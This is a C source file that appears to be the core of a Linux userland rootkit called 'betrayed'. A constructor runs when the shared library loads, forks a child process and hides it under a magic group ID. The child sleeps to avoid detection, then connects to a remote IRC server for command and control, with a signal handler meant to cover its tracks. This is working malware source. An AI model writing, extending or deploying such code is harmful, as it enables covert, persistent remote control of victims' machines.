#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>
#include <termio.h>
#include <dirent.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <limits.h>
#include <fnmatch.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <linux/netlink.h>

#include "betrayed.h"
#include "config.h"
#include "utils.c"
#include "hooks.c"

void __attribute ((constructor)) binit (void)
{
    /* don't try to fork if we've already got an instance running.
     * that would be bad news. */
    /* we specifically need to not fork off of some processes in order
     * to stay hidden. */
    if(is_betrayed_alive() || is_bad_proc(cprocname())) return;

    /* in case you don't care about being root/hiding the process...
     * i was also doing this check once the process had been forked,
     * but nonono. that's also silly! */
    int r=0;
    #ifndef DM_ROOT
    if(getuid() != 0) return;
    r=1;
    #endif

    if(fork()==0){

        setpgrp(); // we our own being

        /* hide our process once we've forked. and we know we're root. */
        if(r) (void) setgid(MGID);

        /* wait BPROC_WAIT secs before doing anything. this helps us stay hidden. */
        sleep(BPROC_WAIT);

        /* make socket, connect to socket. exit(0) if we can't connect.
         * every new process will attempt to connect until a successful
         * connection is made.
         */
        sockfd=setup_connection();

        /* setup our signal handler so that we can close the socket to
         * the irc server should our process get terminated. (by us)
         * our function 'kill_rk_procs' sends SIGTERM to all rootkit
         * processes should we need to hide our presence. */
        signal(SIGTERM,(sighandler_t)commit_termicide);
        betrayer(sockfd);
    }else return;
}
